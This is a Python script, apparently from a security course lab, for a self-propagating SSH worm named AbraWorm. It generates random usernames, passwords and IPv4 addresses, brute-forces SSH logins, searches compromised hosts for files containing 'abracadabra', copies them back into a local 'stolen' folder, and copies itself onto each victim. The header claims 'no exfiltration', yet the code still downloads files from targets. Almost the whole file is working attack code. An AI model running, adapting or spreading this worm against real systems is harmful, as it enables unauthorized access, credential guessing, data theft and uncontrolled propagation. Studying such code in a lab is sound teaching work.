#!/usr/bin/env python3

### AbraWorm.py (Simplified Lab Version)
### Modified for educational use (no exfiltration)

import sys
import os
import random
import paramiko
import scp
import signal

def sig_handler(signum, frame):
    os.kill(os.getpid(), signal.SIGKILL)

signal.signal(signal.SIGINT, sig_handler)

debug = 1

NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
              bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
              cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
              faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
              kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
              let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
              odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
              pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
              sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
              wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
             ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug:
        return ['seed']
    if how_many == 0:
        return []
    selector = "{0:03b}".format(random.randint(0, 7))
    return [''.join([
        random.choice(trigrams) if int(selector[i]) == 1 else random.choice(digrams)
        for i in range(3)
    ]) for _ in range(how_many)]

def get_new_passwds(how_many):
    if debug:
        return ['dees']
    if how_many == 0:
        return []
    selector = "{0:03b}".format(random.randint(0, 7))
    return [''.join([
        random.choice(trigrams) + (str(random.randint(0, 9)) if random.random() > 0.5 else '')
        if int(selector[i]) == 1 else random.choice(digrams)
        for i in range(3)
    ]) for _ in range(how_many)]

def get_fresh_ipaddresses(how_many):
    if debug:
        return ['172.22.0.2','172.22.0.4']
    if how_many == 0:
        return []
    ipaddresses = []
    for _ in range(how_many):
        parts = [str(1 + random.randint(0, 223)) for _ in range(4)]
        ipaddresses.append(".".join(parts))
    return ipaddresses


def main():

    # Create folder for stolen files
    os.makedirs("stolen", exist_ok=True)

    while True:
        usernames = get_new_usernames(NUSERNAMES)
        passwds = get_new_passwds(NPASSWDS)

        for passwd in passwds:
            for user in usernames:
                for ip_address in get_fresh_ipaddresses(NHOSTS):

                    print(f"\nTrying {user}@{ip_address} with password {passwd}")

                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)

                        print("Connected!")

                        # Check if already infected
                        stdin, stdout, stderr = ssh.exec_command('ls')
                        files = [line.strip() for line in stdout.readlines()]

                        if 'AbraWorm.py' in files:
                            print("Already infected. Skipping.")
                            ssh.close()
                            continue

                        # Find files containing 'abracadabra'
                        stdin, stdout, stderr = ssh.exec_command('grep -ls abracadabra *')
                        files_of_interest = [line.strip() for line in stdout.readlines()]

                        print("Files found:", files_of_interest)

                        # Download files
                        if files_of_interest:
                            scpcon = scp.SCPClient(ssh.get_transport())

                            for file in files_of_interest:
                                print("Downloading:", file)
                                scpcon.get(file, local_path="stolen/")

                            scpcon.close()

                        # Copy worm to target
                        scpcon = scp.SCPClient(ssh.get_transport())
                        scpcon.put(sys.argv[0])
                        scpcon.close()

                        print("Worm copied to target.")

                        ssh.close()

                    except Exception as e:
                        print("Error:", e)
                        continue

        if debug:
            break


if __name__ == "__main__":
    main()

